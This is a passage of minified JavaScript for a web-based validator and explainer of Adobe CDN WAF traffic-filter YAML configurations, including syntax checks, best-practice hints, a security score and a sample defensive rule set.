jt.allActionTypes}},P=(e,t)=>{const n=e.split("\n").slice(0,t);let r=-1;for(let a=n.length-1;a>=0;a--){const e=n[a],t=e.trim();if(""===t||t.startsWith("#"))continue;const i=e.search(/\S/);if("actions:"===t||"action:"===t||t.startsWith("actions:")||t.startsWith("action:"))return r=i,!0;if("transform:"===t||t.startsWith("transform:"))return!0;if(("when:"===t||t.startsWith("when:"))&&i<=r)return!1;if(t.startsWith("- name:"))return!1}return!1},T=(e,t)=>{const n=[],r=[];e.includes("kind:")||n.push({line:1,type:"structure",severity:"error",message:'Missing required "kind" field',suggestion:'Add kind: "CDN" at the top of your configuration'}),e.includes("version:")||r.push({line:1,type:"structure",severity:"warning",message:'Missing "version" field',suggestion:'Add version: "1" for clarity'}),e.includes("data:")||n.push({line:1,type:"structure",severity:"error",message:'Missing required "data" section',suggestion:"Add data: section containing your configuration"});const a=e.includes("trafficFilters:")||e.includes("requestTransformations:")||e.includes("responseTransformations:")||e.includes("redirects:")||e.includes("originSelectors:");return e.includes("data:")&&!a&&r.push({line:1,type:"structure",severity:"warning",message:"No configuration rules found in data section",suggestion:"Add trafficFilters, requestTransformations, responseTransformations, redirects, or originSelectors"}),{errors:n,warnings:r}},q=(e,t,n)=>{const r=[...t],a={"{":"}","[":"]"},i={"}":"{","]":"["};for(const s of e)if(a[s])r.push({char:s,line:n});else if(i[s]){if(0===r.length)return{stack:r,error:{line:n,type:"syntax",severity:"error",message:"Unexpected closing ".concat(s),suggestion:"Remove extra closing bracket or add matching opening bracket"}};const e=r.pop();if(e.char!==i[s])return{stack:r,error:{line:n,type:"syntax",severity:"error",message:"Mismatched brackets: expected ".concat(a[e.char]," but found ").concat(s),suggestion:"Check bracket pairing"}}}return{stack:r,error:null}},E=(e,t,n,r,a)=>{const i=[];if(t.length>0&&!t.startsWith("-")&&!t.startsWith("#")&&!t.includes(":")&&!t.includes("{")&&!t.includes("[")&&!t.startsWith('"')&&!t.startsWith("'")&&a>0&&!r[a-1].trim().endsWith(":")){const e=r[a-1].trim();!e.endsWith(":")&&!e.endsWith("|")&&e.endsWith(">")}if((t.match(/:/g)||[]).length>2&&t.includes("http"),t.includes(': "')&&!t.endsWith('"')&&!t.includes('",')){(t.match(/"/g)||[]).length%2!==0&&i.push({line:n,type:"syntax",severity:"error",message:"Unclosed string quote",suggestion:"Add closing double quote"})}if(t.includes(": '")&&!t.endsWith("'")&&!t.includes("',")){(t.match(/'/g)||[]).length%2!==0&&i.push({line:n,type:"syntax",severity:"error",message:"Unclosed string quote",suggestion:"Add closing single quote"})}if(t.includes(": ")&&!t.includes('"')&&!t.includes("'")){const e=t.split(": ")[1];e&&/[{}[\]&*!|>%@`]/.test(e)&&i.push({line:n,type:"syntax",severity:"warning",message:"Value contains special characters that should be quoted",suggestion:'Wrap the value in quotes: "value"'})}return i},L=(e,t)=>{const n=[],r=[];return 0===e.length&&n.push({line:t,type:"value",severity:"error",message:"Rule name cannot be empty",suggestion:"Provide a descriptive name for the rule"}),e.length>60&&r.push({line:t,type:"value",severity:"warning",message:"Rule name is quite long",suggestion:"Consider using a shorter, more concise name"}),/[^a-zA-Z0-9-_]/.test(e)&&r.push({line:t,type:"value",severity:"warning",message:"Rule name contains special characters",suggestion:"Use only alphanumeric characters, hyphens, and underscores"}),{errors:n,warnings:r}},R=(e,t,n,r,a)=>{const i=[];return t||i.push({line:a,type:"structure",severity:"error",message:'Rule "'.concat(r,'" is missing required "when" condition'),suggestion:'Add a "when:" section with conditions'}),n||i.push({line:a,type:"structure",severity:"error",message:'Rule "'.concat(r,'" is missing required "action" or "actions"'),suggestion:'For trafficFilters use "action:", for transformations use "actions:"'}),{errors:i,warnings:[]}},O=(e,t)=>{const n=[];return e.includes("action: block")&&!e.includes("action: log")&&n.push({type:"best-practice",severity:"info",message:"Consider adding LOG rules alongside BLOCK rules",suggestion:"Start with LOG mode to validate rules before blocking to avoid false positives"}),!e.includes("ATTACK-FROM-BAD-IP")&&e.includes("wafFlags")&&n.push({type:"best-practice",severity:"info",message:"Consider adding ATTACK-FROM-BAD-IP flag",suggestion:"ATTACK-FROM-BAD-IP is safe to use in BLOCK mode immediately"}),!e.includes("rateLimit")&&e.includes("trafficFilters")&&n.push({type:"best-practice",severity:"info",message:"Consider adding rate limiting rules",suggestion:"Rate limits protect against DoS attacks and traffic spikes"}),e.includes("clientCountry")&&!e.includes("alert: true")&&n.push({type:"best-practice",severity:"info",message:"Consider enabling alerts for geo-blocking rules",suggestion:"Add alert: true to receive notifications when geo-block rules trigger"}),n},F=e=>{const t=Object.keys(pt),n=[...new Set(e.flatMap(e=>e.wafFlags))];return{used:n.length,total:t.length,percentage:Math.round(n.length/t.length*100),missing:t.filter(e=>!n.includes(e))}},I=e=>e.wafFlags.length>0?{type:"WAF Rule",color:"purple",icon:"\ud83d\udee1\ufe0f"}:e.rateLimit?{type:"Rate Limit",color:"orange",icon:"\u23f1\ufe0f"}:e.geoBlock?{type:"Geo-Block",color:"blue",icon:"\ud83c\udf0d"}:"allow"===e.action?{type:"Allow Rule",color:"green",icon:"\u2705"}:{type:"Traffic Filter",color:"gray",icon:"\ud83d\udd12"},M=e=>{const t=[],n={block:"Blocks",log:"Logs (but allows)",allow:"Allows"}[e.action]||"Processes";if(t.push(n),e.wafFlags.length>0){const n=e.wafFlags.map(e=>{const t=pt[e];return(null===t||void 0===t?void 0:t.attackType)||e}).filter((e,t,n)=>n.indexOf(e)===t);t.push("".concat(n.join(" and ")," attacks"))}else if(e.rateLimit){const n=e.rateLimit.limit*e.rateLimit.window;t.push("requests exceeding ".concat(e.rateLimit.limit,"/sec (").concat(n.toLocaleString()," total in ").concat(e.rateLimit.window,"s)"))}else if(e.geoBlock&&e.geoBlock.countries.length>0)t.push("traffic from ".concat(e.geoBlock.countries.length," ").concat(1===e.geoBlock.countries.length?"country":"countries"));else if(e.conditions.length>0){const n=e.conditions[0],r={path:"requests to specific paths",clientIp:"requests from specific IPs",clientCountry:"requests from specific countries",userAgent:"requests with specific user agents",method:"specific HTTP methods",tier:"requests on specific tier",domain:"requests to specific domain"};t.push(r[n.property]||"requests matching ".concat(n.property))}else t.push("matching requests");return"publish"===e.tier?t.push("on the public website"):"author"===e.tier&&t.push("on the authoring instance"),e.alert&&t.push("and sends alerts"),t.join(" ")+"."},D=e=>{const t=[];I(e);if(t.push("\n\ud83d\udcdd **What this rule does in simple terms:**\n".concat(M(e),"\n")),e.wafFlags.length>0&&(t.push("\n\n\ud83d\udee1\ufe0f **Security Protections:**\n"),e.wafFlags.forEach(e=>{const n=pt[e];n?t.push("\u2022 **".concat(e,"**: Detects ").concat(n.attackType.toLowerCase()," attacks. ").concat(n.description,"\n")):t.push("\u2022 **".concat(e,"**: Security flag protection\n"))}),e.wafFlags.includes("ATTACK-FROM-BAD-IP")&&t.push("\n\ud83d\udc9a **Safe to Block**: This rule only fires when BOTH a known bad IP AND an attack pattern are detected. Very low false positive risk.\n"),e.wafFlags.includes("ATTACK")&&"log"!==e.action&&t.push("\n\u26a0\ufe0f **Caution**: The ATTACK flag can sometimes match legitimate requests. Consider starting with LOG mode to monitor before blocking.\n")),e.rateLimit){const n=e.rateLimit,r=n.limit*n.window;if(t.push("\n\n\u23f1\ufe0f **Rate Limiting Explained:**\n"),t.push("This rule allows **".concat(n.limit," requests per second** measured over a **").concat(n.window,"-second** window.\n")),t.push("That means up to **".concat(r.toLocaleString()," total requests** are allowed in any ").concat(n.window,"-second period.\n")),"fetches"===n.count?t.push("\n\ud83d\udccc Only counting requests that reach your server (ignores cached responses).\n"):"errors"===n.count?t.push("\n\ud83d\udccc Only counting failed requests (4xx/5xx errors). Good for detecting brute force attacks.\n"):t.push("\n\ud83d\udccc Counting ALL requests including those served from cache.\n"),n.penalty){const e=Math.round(n.penalty/60);t.push("\n\ud83d\udeab **Penalty**: Once limit is exceeded, the offender is blocked for **".concat(e," minute").concat(1!==e?"s":"","** (").concat(n.penalty," seconds).\n"))}if(n.groupBy&&n.groupBy.length>0){const e={clientIp:"each IP address","clientIp/24":"each IP subnet (/24)",clientCountry:"each country",path:"each URL path"},r=n.groupBy.map(t=>e[t]||t);t.push("\n\ud83d\udc65 Limits are tracked separately for ".concat(r.join(" and "),".\n"))}}if(e.geoBlock&&e.geoBlock.countries.length>0){t.push("\n\n\ud83c\udf0d **Geographic Blocking:**\n");const n=e.geoBlock.countries.map(e=>{const t=xt.find(t=>t.code===e);return t?t.name:e});n.length<=5?t.push("Traffic from ".concat(n.join(", ")," will be ").concat("block"===e.action?"blocked":"affected",".\n")):t.push("Traffic from ".concat(n.slice(0,5).join(", ")," and ").concat(n.length-5," other countries will be ").concat("block"===e.action?"blocked":"affected",".\n"))}if(e.conditions.length>0){t.push("\n\n\ud83c\udfaf **When does this rule apply?**\n");const n="OR"===e.conditionLogic?"ANY":"ALL";e.conditions.length>1&&t.push("The request must match **".concat(n,"** of these conditions:\n")),e.conditions.forEach(e=>{const n=_(e);t.push("\u2022 ".concat(n,"\n"))})}if(e.tier&&(t.push("\n\n\ud83d\udccd **Where it applies:**\n"),"both"===e.tier?t.push("Both the public website (publish) and content authoring (author) environments.\n"):"author"===e.tier?t.push("Only the content authoring environment (where editors work).\n"):t.push("Only the public website (what visitors see).\n")),e.action){t.push("\n\n\u26a1 **What happens when triggered:**\n");const n={block:"The request is **immediately rejected** with a 403 Forbidden error. The user sees an error page.",log:"The request is **allowed through** but recorded in CDN logs. Use this to test rules safely before blocking.",allow:"The request is **explicitly allowed** to proceed, skipping any subsequent blocking rules."};t.push("".concat(n[e.action]||e.action,"\n"))}return e.alert&&(t.push("\n\n\ud83d\udd14 **Notifications:**\n"),t.push("You will receive alerts when this rule is triggered. Check your Cloud Manager notification settings.\n")),t.join("")},_=e=>{const t={path:"the URL path",url:"the full URL",queryString:"the query parameters",method:"the HTTP method",tier:"the environment tier",domain:"the domain name",clientIp:"the visitor's IP address",clientCountry:"the visitor's country",clientAsn:"the visitor's network provider",clientRegion:"the visitor's region",userAgent:"the browser/user agent",referer:"the referring page"}[e.property]||e.property,n={equals:"is exactly",notEquals:"is not",like:"contains",notLike:"does not contain",matches:"matches the pattern",doesNotMatch:"does not match the pattern",in:"is one of",notIn:"is not one of",exists:"is present",doesNotExist:"is not present"}[e.operator]||e.operator,r=Array.isArray(e.value)?e.value.join(", "):e.value;return"".concat(t," ").concat(n,' "').concat(r,'"')},B=e=>{const t=[];return e.wafFlags.forEach(e=>{const n=pt[e];n&&n.examples&&n.examples.forEach(r=>{t.push({attack:r,flag:e,type:n.attackType,severity:n.severity,mitigates:n.mitigates})})}),t},z=()=>{if(!v)return null;let e=0;const t=[],n=Math.min(40,.4*v.coverage.percentage);e+=n,t.push({label:"WAF Coverage",score:n,max:40});const r=v.rateLimitRules>0?20:0;e+=r,t.push({label:"Rate Limiting",score:r,max:20});const a=v.geoBlockRules>0?15:0;e+=a,t.push({label:"Geo-Blocking",score:a,max:15});const i=v.blocking>0?15:0;e+=i,t.push({label:"Active Blocking",score:i,max:15});const s=v.withAlerts>0?10:0;return e+=s,t.push({label:"Alert Configuration",score:s,max:10}),{score:Math.round(e),maxScore:100,details:t}},W=e=>{switch(e){case"error":return"\u274c";case"warning":return"\u26a0\ufe0f";case"info":return"\ud83d\udca1";default:return"\u2139\ufe0f"}},H=e=>{switch(e){case"error":return"validation-error";case"warning":return"validation-warning";default:return"validation-info"}};return(0,i.jsxs)("div",{className:"rules-analyzer",children:[(0,i.jsxs)("div",{className:"analyzer-header",children:[(0,i.jsxs)("div",{children:[(0,i.jsxs)("h1",{children:[(0,i.jsxs)("svg",{width:"28",height:"28",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("circle",{cx:"11",cy:"11",r:"8"}),(0,i.jsx)("path",{d:"m21 21-4.35-4.35"}),(0,i.jsx)("path",{d:"M11 8v6"}),(0,i.jsx)("path",{d:"M8 11h6"})]}),"WAF Rules Analyzer & Validator"]}),(0,i.jsx)("p",{children:"Comprehensive analysis and syntax validation of your cdn.yaml configuration"})]}),(0,i.jsxs)("div",{className:"analyzer-actions",children:[(0,i.jsxs)("button",{className:"btn btn-ghost",onClick:()=>m(!f),children:[(0,i.jsxs)("svg",{width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("path",{d:"M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"}),(0,i.jsx)("polyline",{points:"14 2 14 8 20 8"})]}),"Examples"]}),(0,i.jsxs)("button",{className:"btn btn-ghost",onClick:()=>h(!p),children:[(0,i.jsxs)("svg",{width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("polyline",{points:"16 18 22 12 16 6"}),(0,i.jsx)("polyline",{points:"8 6 2 12 8 18"})]}),"Syntax"]}),(0,i.jsxs)("button",{className:"btn btn-secondary",onClick:()=>o(!s),children:[(0,i.jsx)("svg",{width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:(0,i.jsx)("path",{d:"M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"})}),"WAF Flags"]})]})]}),f&&(0,i.jsxs)("div",{className:"examples-panel card animate-slide-up",children:[(0,i.jsxs)("div",{className:"card-header",children:[(0,i.jsxs)("h3",{className:"card-title",children:[(0,i.jsx)("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:(0,i.jsx)("path",{d:"M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"})}),"Rule Examples from Adobe Documentation"]}),(0,i.jsx)("button",{className:"btn btn-ghost btn-sm",onClick:()=>m(!1),children:"\xd7"})]}),(0,i.jsx)("div",{className:"examples-grid",children:kt.map((e,n)=>(0,i.jsxs)("div",{className:"example-card",children:[(0,i.jsxs)("div",{className:"example-header",children:[(0,i.jsx)("span",{className:"example-category",children:e.category}),(0,i.jsx)("code",{className:"example-name",children:e.name})]}),(0,i.jsx)("pre",{className:"example-yaml",children:e.yaml}),(0,i.jsx)("p",{className:"example-explanation",children:e.explanation}),(0,i.jsx)("button",{className:"btn btn-ghost btn-sm",onClick:()=>t(t=>t+"\n"+e.yaml),children:"Add to Input"})]},n))})]}),p&&(0,i.jsxs)("div",{className:"syntax-panel card animate-slide-up",children:[(0,i.jsxs)("div",{className:"card-header",children:[(0,i.jsxs)("h3",{className:"card-title",children:[(0,i.jsxs)("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("polyline",{points:"16 18 22 12 16 6"}),(0,i.jsx)("polyline",{points:"8 6 2 12 8 18"})]}),"Rules Syntax Reference"]}),(0,i.jsx)("button",{className:"btn btn-ghost btn-sm",onClick:()=>h(!1),children:"\xd7"})]}),(0,i.jsxs)("div",{className:"syntax-sections",children:[(0,i.jsxs)("div",{className:"syntax-section",children:[(0,i.jsx)("h4",{children:"\ud83d\udccb Rule Properties"}),(0,i.jsx)("div",{className:"syntax-table",children:Object.entries(ft).map(e=>{let[t,n]=e;return(0,i.jsxs)("div",{className:"syntax-row",children:[(0,i.jsx)("code",{className:"syntax-key",children:t}),(0,i.jsx)("span",{className:"syntax-required",children:n.required?"Required":"Optional"}),(0,i.jsx)("span",{className:"syntax-desc",children:n.description})]},t)})})]}),(0,i.jsxs)("div",{className:"syntax-section",children:[(0,i.jsx)("h4",{children:"\ud83d\udd0d Match Operators"}),(0,i.jsx)("div",{className:"syntax-table",children:Object.entries(mt).map(e=>{let[t,n]=e;return(0,i.jsxs)("div",{className:"syntax-row",children:[(0,i.jsx)("code",{className:"syntax-key",children:t}),(0,i.jsx)("span",{className:"syntax-desc",children:n.description}),(0,i.jsx)("code",{className:"syntax-example",children:n.example})]},t)})})]}),(0,i.jsxs)("div",{className:"syntax-section",children:[(0,i.jsx)("h4",{children:"\ud83d\udccd Request Properties"}),(0,i.jsx)("div",{className:"syntax-table",children:Object.entries(gt).map(e=>{let[t,n]=e;return(0,i.jsxs)("div",{className:"syntax-row",children:[(0,i.jsx)("code",{className:"syntax-key",children:t}),(0,i.jsx)("span",{className:"syntax-desc",children:n.description}),(0,i.jsxs)("span",{className:"syntax-example-text",children:["e.g., ",n.example]})]},t)})})]})]})]}),s&&(0,i.jsxs)("div",{className:"waf-reference card animate-slide-up",children:[(0,i.jsxs)("div",{className:"card-header",children:[(0,i.jsxs)("h3",{className:"card-title",children:[(0,i.jsx)("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:(0,i.jsx)("path",{d:"M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"})}),"WAF Flags Reference (Requires Extended Security License)"]}),(0,i.jsx)("button",{className:"btn btn-ghost btn-sm",onClick:()=>o(!1),children:"\xd7"})]}),(0,i.jsx)("div",{className:"table-container",children:(0,i.jsxs)("table",{className:"table",children:[(0,i.jsx)("thead",{children:(0,i.jsxs)("tr",{children:[(0,i.jsx)("th",{children:"Flag"}),(0,i.jsx)("th",{children:"Category"}),(0,i.jsx)("th",{children:"Severity"}),(0,i.jsx)("th",{children:"Description"}),(0,i.jsx)("th",{children:"Recommended Action"}),(0,i.jsx)("th",{children:"Attack Examples"})]})}),(0,i.jsx)("tbody",{children:Object.entries(pt).map(e=>{var t;let[n,r]=e;return(0,i.jsxs)("tr",{children:[(0,i.jsxs)("td",{children:[(0,i.jsx)("code",{className:"code-inline",children:r.name}),r.recommended&&(0,i.jsx)("span",{className:"recommended-badge",children:"\u2605 Recommended"})]}),(0,i.jsx)("td",{children:r.category}),(0,i.jsx)("td",{children:(0,i.jsx)("span",{className:"badge",style:{background:ht[r.severity].bg,color:ht[r.severity].color},children:r.severity})}),(0,i.jsx)("td",{className:"desc-cell",children:r.description}),(0,i.jsx)("td",{children:(0,i.jsx)("span",{className:"action-recommendation ".concat(r.recommendedAction||"log"),children:(null===(t=r.recommendedAction)||void 0===t?void 0:t.toUpperCase())||"LOG first"})}),(0,i.jsx)("td",{children:(0,i.jsx)("div",{className:"example-list",children:r.examples.slice(0,2).map((e,t)=>(0,i.jsx)("code",{className:"example-code",children:e},t))})})]},n)})})]})})]}),(0,i.jsxs)("div",{className:"analyzer-grid",children:[(0,i.jsxs)("div",{className:"input-panel card",children:[(0,i.jsxs)("div",{className:"card-header",children:[(0,i.jsxs)("h3",{className:"card-title",children:[(0,i.jsxs)("svg",{width:"20",height:"20",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("path",{d:"M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"}),(0,i.jsx)("polyline",{points:"14 2 14 8 20 8"})]}),"cdn.yaml Configuration"]}),(0,i.jsx)("button",{className:"btn btn-ghost btn-sm",onClick:()=>{t('kind: "CDN"\nversion: "1"\nmetadata:\n  envTypes:\n    - dev\n    - stage\n    - prod\ndata:\n  trafficFilters:\n    rules:\n      # ================================================\n      # STANDARD TRAFFIC FILTER RULES\n      # Available with Sites/Forms license (included)\n      # ================================================\n\n      # Rate limit at ORIGIN layer - protect backend from traffic spikes\n      - name: rate-limit-origin-requests\n        when:\n          reqProperty: tier\n          equals: "publish"\n        rateLimit:\n          limit: 100\n          window: 10\n          count: fetches\n          penalty: 300\n          groupBy:\n            - reqProperty: clientIp\n        action: log\n\n      # Rate limit at CDN EDGE layer - all requests including cached\n      - name: rate-limit-edge-requests\n        when:\n          reqProperty: tier\n          equals: "publish"\n        rateLimit:\n          limit: 500\n          window: 10\n          count: all\n          penalty: 300\n          groupBy:\n            - reqProperty: clientIp\n        action: log\n\n      # Block requests from OFAC sanctioned countries\n      - name: block-ofac-countries\n        when:\n          reqProperty: clientCountry\n          in:\n            - SY\n            - BY\n            - MM\n            - KP\n            - IR\n            - CU\n            - SD\n        action: block\n\n      # Block suspicious paths\n      - name: block-admin-paths\n        when:\n          allOf:\n            - { reqProperty: tier, equals: "publish" }\n            - { reqProperty: path, like: "/admin/*" }\n        action: block\n\n      # ================================================\n      # WAF TRAFFIC FILTER RULES\n      # Requires Extended Security (WAF-DDoS) license\n      # ================================================\n\n      # Block attacks from known malicious IPs - SAFE to BLOCK immediately\n      - name: block-attacks-from-bad-ips\n        when:\n          reqProperty: tier\n          equals: "publish"\n        action:\n          type: block\n          wafFlags:\n            - ATTACK-FROM-BAD-IP\n\n      # Log general attacks - Start with LOG, move to BLOCK after review\n      - name: log-all-attacks\n        when:\n          reqProperty: tier\n          equals: "publish"\n        action:\n          type: log\n          wafFlags:\n            - ATTACK\n\n      # Block SQL injection attempts\n      - name: block-sqli-attacks\n        when:\n          reqProperty: tier\n          equals: "publish"\n        action:\n          type: block\n          wafFlags:\n            - SQLI\n\n      # Block XSS attempts\n      - name: block-xss-attacks\n        when:\n          reqProperty: tier\n          equals: "publish"\n        action:\n          type: block\n          wafFlags:\n            - XSS\n')},children:"Load Sample"})]}),(0,i.jsxs)("div",{className:"input-with-lines",children:[(0,i.jsx)("div",{className:"line-numbers",children:e.split("\n").map((e,t)=>(0,i.jsx)("div",{className:"line-number ".concat(null!==b&&void 0!==b&&b.errors.some(e=>e.line===t+1)?"has-error":null!==b&&void 0!==b&&b.warnings.some(e=>e.line===t+1)?"has-warning":""),children:t+1},t))}),(0,i.jsx)("textarea",{className:"form-textarea yaml-input",value:e,onChange:e=>t(e.target.value),placeholder:'Paste your cdn.yaml content here...\n\nkind: "CDN"\nversion: "1"\ndata:\n  trafficFilters:\n    rules:\n      - name: my-rule\n        when:\n          reqProperty: tier\n          equals: \'publish\'\n        action: block'})]}),g&&(0,i.jsxs)("div",{className:"parse-error",children:[(0,i.jsxs)("svg",{width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",children:[(0,i.jsx)("circle",{cx:"12",cy:"12",r:"10"}),(0,i.jsx)("line",{x1:"15",y1:"9",x2:"9",y2:"15"}),(0,i.jsx)("line",{x1:"9",y1:"9",x2:"15",y2:"15"})]}),g]}),(0,i.jsxs)("button",{className:"btn btn-primary btn-lg analyze-btn",onClick:()=>{const t=(e=>{const t=[],r=[],a=[],i=e.split("\n");let s=!1,o=!1,l=null,c=0,u=!1,d=!1,p=!1,h=[],f=null,m=0,g=!1;const y=T(e,i);t.push(...y.errors),r.push(...y.warnings);for(let n=0;n<i.length;n++){const a=i[n],y=n+1,v=a.trim(),x=a.length-a.trimStart().length;if(""===v||v.startsWith("#"))continue;"origins:"===v||v.startsWith("origins:")?(g=!0,s=!1,o=!1,f="origins",m=x):"trafficFilters:"===v||v.startsWith("trafficFilters:")?(g=!1,f="trafficFilters",m=x):"requestTransformations:"===v||v.startsWith("requestTransformations:")?(g=!1,f="requestTransformations",m=x):"responseTransformations:"===v||v.startsWith("responseTransformations:")?(g=!1,f="responseTransformations",m=x):"redirects:"===v||v.startsWith("redirects:")?(g=!1,f="redirects",m=x):("originSelectors:"===v||v.startsWith("originSelectors:"))&&(g=!1,f="originSelectors",m=x),a.includes("\t")&&t.push({line:y,type:"syntax",severity:"error",message:"YAML uses spaces for indentation, not tabs",suggestion:"Replace tabs with spaces (typically 2 spaces per indent level)"});const b=q(v,h,y);b.error&&t.push(b.error),h=b.stack;const w=E(a,v,y,i,n);if(t.push(...w),v.startsWith("kind:")){const e=v.replace("kind:","").trim().replace(/['"]/g,"");jt.kindTypes.includes(e)||t.push({line:y,type:"value",severity:"error",message:'Invalid kind: "'.concat(e,'"'),suggestion:"Valid kind values: ".concat(jt.kindTypes.join(", "))})}let k=null;for(let e=n-1;e>=0;e--){const t=i[e].trim();if(i[e].length-i[e].trimStart().length<x&&t.endsWith(":")){k=t.replace(":","").trim();break}}if(v.match(/^[a-zA-Z]+:/)&&!v.startsWith("-")){const e=v.split(":")[0].trim();if("data"===k&&!jt.configSections.includes(e)){const n=jt.configSections.find(t=>e.toLowerCase().includes(t.toLowerCase().slice(0,5))||t.toLowerCase().includes(e.toLowerCase().slice(0,5)));t.push({line:y,type:"section",severity:"error",message:'Invalid configuration section: "'.concat(e,'"'),suggestion:n?'Did you mean "'.concat(n,'"? Valid sections under data: ').concat(jt.configSections.join(", ")):"Valid sections under data: are: ".concat(jt.configSections.join(", "))})}if("metadata"===k&&(jt.metadataProperties.includes(e)||t.push({line:y,type:"property",severity:"error",message:'Invalid metadata property: "'.concat(e,'"'),suggestion:"Valid metadata properties are: ".concat(jt.metadataProperties.join(", "))})),"rateLimit"===k&&!jt.rateLimitProperties.includes(e)){const n=jt.rateLimitProperties.find(t=>e.toLowerCase().startsWith(t.toLowerCase().slice(0,3)));t.push({line:y,type:"property",severity:"error",message:'Invalid rateLimit property: "'.concat(e,'"'),suggestion:n?'Did you mean "'.concat(n,'"? Valid: ').concat(jt.rateLimitProperties.join(", ")):"Valid rateLimit properties: ".concat(jt.rateLimitProperties.join(", "))})}}const j=v.match(/^([a-zA-Z][a-zA-Z0-9_]*)\s*:/);if(j&&!v.startsWith("-")){const e=j[1];if(!jt.allValidProperties.includes(e)){const n=e=>{const t=e.toLowerCase();return jt.allValidProperties.find(e=>{const n=e.toLowerCase();if(t.length>=3&&n.startsWith(t.slice(0,3)))return!0;if(n.length>=3&&t.startsWith(n.slice(0,3)))return!0;if(t.includes(n)||n.includes(t))return!0;let r=0;for(let a=0;a<Math.min(t.length,n.length);a++)t[a]===n[a]&&r++;return r>=.7*Math.min(t.length,n.length)})},r=n(e);let a="";e.toLowerCase().includes("traffic")||e.toLowerCase().includes("filter")?a="trafficFilters":e.toLowerCase().includes("request")||e.toLowerCase().includes("transform")?a="requestTransformations":e.toLowerCase().includes("response")?a="responseTransformations":e.toLowerCase().includes("redirect")?a="redirects":e.toLowerCase().includes("origin")?a="originSelectors or origins":(e.toLowerCase().includes("limit")||e.toLowerCase().includes("window")||e.toLowerCase().includes("count")||e.toLowerCase().includes("penalty"))&&(a="rateLimit (valid: limit, window, count, penalty, groupBy)"),t.push({line:y,type:"property",severity:"error",message:'Unknown property: "'.concat(e,'"'),suggestion:r?'Did you mean "'.concat(r,'"?').concat(a?" Context: ".concat(a):""):"Check for typos.".concat(a?" This looks like it belongs in ".concat(a):" Valid properties include: name, when, action, type, etc.")})}}if(v.match(/^[a-zA-Z]+[0-9]+[a-zA-Z]*\s*:/)){const e=v.split(":")[0].trim();e.includes("/")||t.push({line:y,type:"property",severity:"error",message:'Invalid property name: "'.concat(e,'" - contains unexpected numbers'),suggestion:"Property names should not contain numbers. Check for typos."})}if(v.match(/^count\s*:\s*(\w+)/)){const e=v.match(/^count\s*:\s*(\w+)/)[1];jt.rateCountTypes.includes(e)||t.push({line:y,type:"value",severity:"error",message:'Invalid count value: "'.concat(e,'"'),suggestion:"Valid values are: ".concat(jt.rateCountTypes.join(", "))})}if(v.match(/^op\s*:\s*(\w+)/)){const e=v.match(/^op\s*:\s*(\w+)/)[1];jt.transformOperations.includes(e)||t.push({line:y,type:"value",severity:"error",message:'Invalid transform operation: "'.concat(e,'"'),suggestion:"Valid operations are: ".concat(jt.transformOperations.join(", "))})}if(v.match(/^status\s*:\s*(\d+)/)){const e=parseInt(v.match(/^status\s*:\s*(\d+)/)[1]);jt.redirectStatuses.includes(e)||t.push({line:y,type:"value",severity:"error",message:"Invalid redirect status: ".concat(e),suggestion:"Valid redirect statuses are: ".concat(jt.redirectStatuses.join(", "))})}if(v.startsWith("- ")&&!v.includes(":")){const e=v.replace("- ","").trim().replace(/['"]/g,"");for(let r=n-1;r>=Math.max(0,n-5);r--)if("envTypes:"===i[r].trim()){!jt.envTypes.includes(e)&&e.match(/^[a-z]+$/)&&t.push({line:y,type:"value",severity:"error",message:'Invalid environment type: "'.concat(e,'"'),suggestion:"Valid envTypes are: ".concat(jt.envTypes.join(", "))});break}}if(g||"rules:"!==v&&!v.includes("rules:")||(s=!0),g&&v.startsWith("- name:")){v.replace("- name:","").trim().replace(/['"]/g,"")||t.push({line:y,type:"value",severity:"error",message:"Origin name cannot be empty",suggestion:'Provide a name like "aem-origin" or "custom-backend"'});continue}if(g){const e=v.match(/^(\w+):/);e&&!v.startsWith("-")&&e[1];continue}if(s&&!g&&v.startsWith("- name:")){if(o&&l){const e=R(p,u,d,l,c);t.push(...e.errors),r.push(...e.warnings)}o=!0,l=v.replace("- name:","").trim().replace(/['"]/g,""),c=y,u=!1,d=!1,p=!0;const e=L(l,y);t.push(...e.errors),r.push(...e.warnings)}if(o&&"when:"===v&&(u=!0),o&&(v.startsWith("action:")||"action:"===v||v.startsWith("actions:")||"actions:"===v)&&(d=!0,v.startsWith("action:")&&"action:"!==v&&!v.startsWith("actions:"))){const n=v.replace("action:","").trim().replace(/['"]/g,""),r=C(e,y),a=A(r);n&&n.length>0&&!n.includes("{")&&(jt.allActionTypes.includes(n)||t.push({line:y,type:"value",severity:"error",message:'Invalid action: "'.concat(n,'"'),suggestion:"Valid actions for ".concat(r||"this context"," are: ").concat(a.join(", "))}))}if(v.startsWith("type:")&&o){const n=v.replace("type:","").trim().replace(/['"]/g,""),r=C(e,y),a=A(r);n&&!a.includes(n)&&(jt.allActionTypes.includes(n)||t.push({line:y,type:"value",severity:"error",message:'Invalid action type: "'.concat(n,'"'),suggestion:"Valid types for ".concat(r||"CDN config",": ").concat(a.join(", "))}))}C(e,y);const N=P(e,y);if(v.includes("reqProperty:")&&!N){const e=v.match(/reqProperty:\s*['"]?(\w+(?:\/\d+)?)['"]?/);if(e){const 